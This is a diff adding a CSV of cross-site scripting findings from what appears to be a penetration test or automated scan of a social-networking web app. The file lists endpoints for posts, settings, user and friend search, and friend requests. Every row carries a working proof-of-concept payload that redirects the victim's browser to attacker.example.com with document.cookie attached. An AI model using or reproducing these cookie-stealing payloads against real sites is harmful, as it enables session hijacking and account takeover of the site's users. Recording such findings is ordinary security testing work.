@@ -1,0 +1,7 @@
+run_id,endpoint,vulnerability,poc
+20260903-0634-0005,`POST /create_post`,Stored XSS,"`content=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
+20260903-0634-0005,`POST /edit_post`,Stored XSS,"`content=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>&id=19`"
+20260903-0634-0005,`POST /settings`,Stored XSS (bio),"`bio=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>` (multipart/form-data)"
+20260903-0634-0005,`GET /users?search=`,Reflected XSS,"`/users?search=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
+20260903-0634-0005,`GET /friends?search=`,Reflected XSS,"`/friends?username=mr_robot&search=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
+20260903-0634-0005,`POST /request_friend`,Reflected XSS,"`username=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
